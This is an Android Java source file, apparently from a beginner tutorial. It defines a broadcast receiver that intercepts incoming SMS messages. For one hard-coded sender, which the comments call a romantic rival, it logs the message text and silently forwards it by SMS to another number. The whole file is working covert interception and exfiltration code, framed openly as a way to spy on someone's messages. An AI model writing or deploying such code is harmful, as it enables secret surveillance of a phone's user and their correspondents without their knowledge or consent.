package cn.novate.android_day01.simple2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

/**
 * Email: 2185134304@qq.com
 * Created by Novate 2018/7/2 11:35
 * Version 1.0
 * Params:
 * Description:    短信监听器的广播接收者，用于接收 接收到短信的事件
*/

public class SMSListenerBroadcastReceiver extends BroadcastReceiver {


    /**
     *
     * @param context
     * @param intent
     */
    @Override
    public void onReceive(Context context, Intent intent) {
        // 1. 取出短信数据，Object数组：表示可能发送多条短信
        Object[] objs = (Object[]) intent.getExtras().get("pdus");
        // 2. 遍历短信数组，取出每一条短信
        for (Object obj : objs) {
            // 3. 得到短信对象
            SmsMessage sms = SmsMessage.createFromPdu((byte[])obj) ;
            // 4. 得到发送短信的电话号码
            String phone = sms.getOriginatingAddress();
            // 5. 判断是否是情敌的电话
            if ("13812345678".equals(phone)){
                // 6. 如果是情敌电话，就取出短信内容
                String content = sms.getMessageBody();
                Log.e("TAG" , "phone: " + phone + ", content: " + content) ;

                // 7. 转发短信
                // destinationAddress 目标电话号码
                // scAddress 短信中心的电话号码
                // text 短信内容
                // sentIntent 发送短信成功提醒使用的意图对象
                // deliveryIntent 对方已接收到短信提醒使用的意图对象
                SmsManager.getDefault().sendTextMessage("5556" , null , content , null , null);
            }
        }
    }
}
